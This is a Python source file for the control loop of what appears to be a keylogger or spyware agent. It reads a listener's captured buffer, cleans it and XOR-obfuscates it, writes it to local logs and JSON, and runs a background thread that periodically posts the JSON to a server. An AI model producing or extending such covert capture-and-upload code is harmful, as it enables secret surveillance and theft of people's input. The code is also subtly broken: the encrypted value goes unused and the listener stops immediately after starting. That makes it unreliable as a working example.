from src.listener import Listener
from src.writer.console_log import ConsoleLog 
from src.writer.file_log import FileLog 
from src.writer.json_log import JsonLog 
from src.parser.encryption.xor import Xor
from src.parser.encryption.parsers import Parser
from time import sleep
from threading import Thread
from agent_network.send_json import post_json
from config.config import write_delay, send_json_delay 

parser=Parser()
xor=Xor()
 


class manager:
    def __init__(self):
        self.l = Listener()
        self.wr = ConsoleLog()
        self.wr2 = FileLog()
        self.json = JsonLog()

    def write_data(self):
        while True:
            sleep(write_delay) 
            # > 0 
            if self.l.buffer_has_data()>0:
                buffer = self.l.get_buffer()
                # preser the list -> str
                print(buffer)
                parser_buffer=parser.clean_and_join(buffer)
                # encript the str 
                encBuffer=xor.encrypt(parser_buffer)
                # write -> json
                self.json.write(parser_buffer)
                
                print(parser_buffer)


    def send_json(self):
        while True:
            sleep(send_json_delay)
            post_json()


    def main(self):
        self.l.start() ## start listening
        Thread(target=self.write_data, daemon=True).start() ## writeing local json thred
        Thread(target=self.send_json, daemon=True).start() ## send json to server thread
        self.l.stop() ## stop listening


